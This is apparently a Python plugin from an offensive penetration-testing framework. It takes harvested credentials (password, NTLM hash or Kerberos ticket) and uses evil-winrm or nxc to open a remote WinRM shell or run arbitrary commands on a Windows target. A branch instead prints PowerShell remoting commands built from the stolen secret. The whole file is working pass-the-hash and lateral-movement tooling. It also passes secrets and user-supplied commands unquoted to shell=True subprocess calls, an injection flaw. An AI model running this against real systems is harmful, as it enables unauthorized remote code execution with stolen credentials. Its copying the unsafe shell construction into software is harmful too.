PROVIDES = ["exec"]
REQUIRES = ["creds"]

def run(
data,
cred,
args,
):


    import os
    import subprocess
    from datetime import datetime

    from core.paths import (
        get_artifacts_dir
    )

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    R = '\033[91m'
    W = '\033[0m'


    windows = getattr(
        args,
        "windows",
        False
    )

    if windows:

        password = cred.get("secret")
        username = cred.get("user")
        host = data.get("hostname")
        domain = data.get("domain")
        print(
            f"\n{B}┌── Windows WinRM ────────────────────┐{W}"
        )

        print()

        print(
            f"{G}[+] {W}Enumerate WinRM Access\n"
        )

        print(
            f'{Y}Get-NetLocalGroupMember -ComputerName {C}{host}{Y} -GroupName "Remote Management Users"{W}'
        )

        print()

        print(
            f"{G}[+] {W}PowerShell Remoting\n"
        )

        print(
            f"{Y}$Password = ConvertTo-SecureString \"{C}{password}{Y}\" -AsPlainText -Force{W}"
        )

        print()

        print(
            f"{Y}$Cred = New-Object System.Management.Automation.PSCredential (\"{C}{domain}\\{username}{Y}\", $Password){W}"
        )

        print()

        print(
            f"{Y}Enter-PSSession -ComputerName {C}{host}{Y} -Credential $Cred{W}"
        )

        print()

        print(
            f"{Y}Invoke-Command -ComputerName {C}{host}{Y} -Credential $Cred -ScriptBlock {{ whoami }}{W}"
        )

        print()

        print(
            f"{G}[+] {W}Existing Session\n"
        )

        print(
            f"{Y}New-PSSession -ComputerName {C}{host}{Y} -Credential $Cred{W}"
        )

        print()

        print(
            f"{Y}Get-PSSession{W}"
        )

        print()

        print(
            f"{Y}Remove-PSSession *{W}"
        )

        print()

        print(
            f"{B}└─────────────────────────────────────┘{W}\n"
        )

        return

    ip = data.get(
        "ip"
    )

    domain = data.get(
        "domain"
    )

    hostname = (
        data.get("hostname")
        or data.get("name")
    )

    if not ip:

        print(
            f"{R}[!] {W}No target IP set"
        )

        return

    if not cred:

        print(
            f"{R}[!] {W}No credentials available"
        )

        return

    user = cred.get(
        "user"
    )

    if "\\" in user:

        user = user.split(
            "\\"
        )[-1]

    typ = cred.get(
        "type"
    )

    secret = (
        cred.get("secret")
        or cred.get("ccache")
    )

    fqdn = (
        f"{hostname}.{domain}"
        if domain
        else hostname
    )

    env = os.environ.copy()

    #
    # BUILD BASE COMMAND
    #

    if typ == "password":

        base_cmd = (
            f"evil-winrm "
            f"-i {ip} "
            f"-u {user} "
            f"-p '{secret}'"
        )

    elif typ == "ntlm":

        base_cmd = (
            f"evil-winrm "
            f"-i {ip} "
            f"-u {user} "
            f"-H {secret}"
        )

    elif typ == "ticket":

        env["KRB5CCNAME"] = secret

        base_cmd = (
            f"evil-winrm "
            f"-i {fqdn} "
            f"-r {domain}"
        )

    else:

        print(
            f"{R}[!] {W}"
            f"Unsupported credential type: "
            f"{typ}"
        )

        return

    print(
        f"\n{B}[*]{W} WinRM Connection\n"
    )

    print(
        f"  {B}├──{W} "
        f"Target: {C}{fqdn}{W}"
    )

    print(
        f"  {B}├──{W} "
        f"User: {C}{user}{W}"
    )

    print(
        f"  {B}└──{W} "
        f"Type: {C}{typ}{W}\n"
    )

    cmd_input = getattr(
        args,
        "cmd",
        None
    )

    #
    # COMMAND MODE
    #

    if cmd_input:

        timestamp = datetime.now().strftime(
            "%Y%m%d_%H%M%S"
        )

        logfile = (
            get_artifacts_dir(
                data["name"]
            )
            / f"winrm_{timestamp}.log"
        )

        if typ == "password":

            cmd = (
                f"nxc winrm {ip} "
                f"-u {user} "
                f"-p '{secret}' "
                f"-X \"{cmd_input}\" "
                f"--no-progress"
            )

        elif typ == "ntlm":

            cmd = (
                f"nxc winrm {ip} "
                f"-u {user} "
                f"-H {secret} "
                f"-X \"{cmd_input}\" "
                f"--no-progress"
            )

        elif typ == "ticket":

            cmd = (
                f"nxc winrm {fqdn} "
                f"-u {user} "
                f"--use-kcache "
                f"-X \"{cmd_input}\" "
                f"--no-progress"
            )

        print(
            f"{Y}{cmd}{W}\n"
        )

        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            env=env
        )

        output = (
            result.stdout
            + result.stderr
        )

        logfile.write_text(
            output
        )

        clean = []

        for line in output.splitlines():

            line = line.strip()

            if not line:
                continue

            if line.startswith(
                "WINRM"
            ):

                parts = line.split()

                if len(parts) >= 5:

                    message = " ".join(
                        parts[4:]
                    )

                    if any(
                        x in message
                        for x in [
                            "Windows",
                            "Pwn3d!",
                            "Executed command"
                        ]
                    ):
                        continue

                    clean.append(
                        message
                    )

                continue

            clean.append(
                line
            )

        if clean:

            print(
                "\n".join(clean)
            )

        else:

            print(
                f"{R}[!] {W}"
                f"No usable output"
            )

        print()

        print(
            f"{G}[+] {W}"
            f"Saved"
        )

        print(
            f"  {B}└── {C}"
            f"{logfile}"
            f"{W}\n"
        )

        return

    #
    # INTERACTIVE MODE
    #

    print(
        f"{Y}{base_cmd}{W}\n"
    )

    subprocess.run(
        base_cmd,
        shell=True,
        env=env
    )
